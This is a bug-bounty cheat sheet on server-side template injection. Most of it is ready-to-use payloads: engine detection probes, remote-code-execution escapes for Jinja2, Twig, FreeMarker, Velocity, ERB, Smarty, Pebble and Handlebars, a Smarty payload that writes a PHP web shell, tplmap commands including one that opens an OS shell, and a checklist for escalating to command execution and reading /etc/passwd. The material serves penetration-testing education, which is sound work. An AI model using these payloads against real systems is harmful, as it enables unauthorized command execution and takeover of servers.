# Server-Side Template Injection (SSTI)
> Sources: Bug Bounty Bootcamp (Li), Real-World Bug Hunting (Yaworski), WSTG v4.2

## What It Is
When user-supplied input is embedded directly into a template and evaluated server-side, allowing arbitrary code execution via the template engine's syntax.

## Detection — The Math Test

```
# Inject simple math expression:
{{7*7}}     → If rendered as "49" → Jinja2/Twig/Pebble
${7*7}      → If rendered as "49" → FreeMarker/Smarty/Spring/Velocity
#{7*7}      → If rendered as "49" → Mvel/Thymeleaf
<%= 7*7 %>  → If rendered as "49" → ERB (Ruby)
*{7*7}      → If rendered as "49" → Thymeleaf OGNL
{{7*'7'}}   → "7777777" → Jinja2 (Python string repetition)
             → "49"      → Twig (PHP arithmetic)
${{7*7}}    → If "49" → Pebble (Java)
```

### Decision Tree for Engine Identification
```
{{}}  works?
├── {{7*'7'}} = 7777777 → Jinja2 (Python)
├── {{7*'7'}} = 49 → Twig (PHP)
└── Not Jinja2/Twig

${}  works?
├── Java-based → FreeMarker, Velocity, Pebble, Spring EL
└── Not Java

<%= %>  works?
└── ERB (Ruby/Rails)

#{} works?
└── Mvel (Java), possibly Thymeleaf

#set()  works?
└── Velocity (Java), Smarty (PHP)
```

---

## Jinja2 (Python/Flask/Django)

### Basic Tests
```
{{7*7}}           → 49
{{config}}        → <Config {...}>
{{request}}
{{config.items()}}
```

### RCE via Sandbox Escape
```python
# Get all subclasses to find subprocess.Popen or os._wrap_close
{{[].__class__.__bases__[0].__subclasses__()}}

# Once you find subprocess.Popen at index N:
{{[].__class__.__bases__[0].__subclasses__()[N](['id'],stdout=-1).communicate()}}

# Simpler approaches:
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{lipsum.__globals__['os'].popen('id').read()}}
{{get_flashed_messages.__globals__['current_app']._static_folder}}

# Most reliable universal Jinja2 RCE:
{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").system("id")')}}
```

### Jinja2 Filter Bypass (when dots blocked)
```python
{{''|attr('__class__')|attr('__mro__')|attr('__getitem__')(2)|attr('__subclasses__')()}}
{{[]['\x5f\x5fclass\x5f\x5f']}}  # hex encoding
```

---

## Twig (PHP)

```php
# Detection
{{7*'7'}}  → 49 (Twig multiplies int and string)

# RCE via Twig filters
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}

# Or:
{{_self.env.registerUndefinedFilterCallback("system")}}
{{_self.env.getFilter("cat /etc/passwd")}}

# Via map filter:
{{['id']|map('system')|join}}
```

---

## FreeMarker (Java)

```
# Detection
${7*7}   → 49

# RCE
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.Execute"?new()("id")}
```

---

## Velocity (Java)

```
# Detection
#set($x = 7*7) $x  → 49

# RCE
#set($x='')##
#set($rt=$x.class.forName('java.lang.Runtime'))##
#set($chr=$x.class.forName('java.lang.Character'))##
#set($str=$x.class.forName('java.lang.String'))##
#set($ex=$rt.getRuntime().exec('id'))##
#set($output=$ex.getInputStream())##
#set($br={"java.io.BufferedReader"?new(${"java.io.InputStreamReader"?new($output)})})##
${br.readLine()}
```

---

## ERB (Ruby on Rails)

```ruby
# Detection
<%= 7 * 7 %>  → 49

# RCE
<%= `id` %>
<%= system("id") %>
<%= IO.popen("id").read %>
<%= require 'open3'; Open3.capture2("id")[0] %>
```

---

## Smarty (PHP)

```php
# Detection
{7*7}  → 49

# RCE
{php}echo `id`;{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

---

## Pebble (Java)

```
# Detection
{{ 7*7 }}    → 49

# RCE
{% set cmd = "id" %}
{% set bytes = (1).TYPE
   .forName('java.lang.Runtime')
   .methods[6]
   .invoke((1).TYPE.forName('java.lang.Runtime').methods[7].invoke(null),cmd.split(" ")) %}
```

---

## Handlebars/Mustache (Node.js)

```javascript
# Handlebars RCE via prototype pollution + SSTI
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

---

## tplmap — Automated SSTI Exploitation

```bash
# Install
git clone https://github.com/epinna/tplmap.git
cd tplmap && pip install -r requirements.txt

# Basic scan (use * to mark injection point)
python3 tplmap.py -u 'https://target.com/page?name=*'

# With cookie
python3 tplmap.py -u 'https://target.com/page?name=*' --cookie 'session=abc123'

# POST body
python3 tplmap.py -u 'https://target.com/page' --data 'name=*&submit=1'

# Get OS shell
python3 tplmap.py -u 'https://target.com/page?name=*' --os-shell
```

---

## Finding SSTI

### Where to Look
- Error messages rendered with user input
- Email templates with user data
- Profile fields (name, bio) rendered in emails or pages
- Search functionality (`No results for "USER_QUERY"`)
- Invoice/document generation with user fields
- User-configurable notification messages
- Custom report builders

### Fuzzing for SSTI
```
# Send these and look for math to be evaluated:
{{7*7}}
${7*7}
#{7*7}
*{7*7}
<%= 7*7 %>
{{7*'7'}}
```

---

## Real-World Examples (Yaworski)
- **Uber** ($10,000): Jinja2 SSTI via `{{1+1}}` in Uber's Flask notification system → RCE
- **Uber** (CSTI in Angular): Client-side template injection `{{constructor.constructor('alert(1)')()}}` 
- **Unikrn** ($7,500): Smarty SSTI → read `/etc/passwd` → escalate to RCE

## Testing Checklist
- [ ] Find inputs reflected in responses
- [ ] Test with `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`
- [ ] Identify template engine from math result
- [ ] Escalate to RCE using engine-specific payload
- [ ] Try tplmap for automated exploitation
- [ ] Report with `/etc/passwd` or `id` command output as PoC

## Severity
- **Critical**: RCE — attacker can run arbitrary commands on server
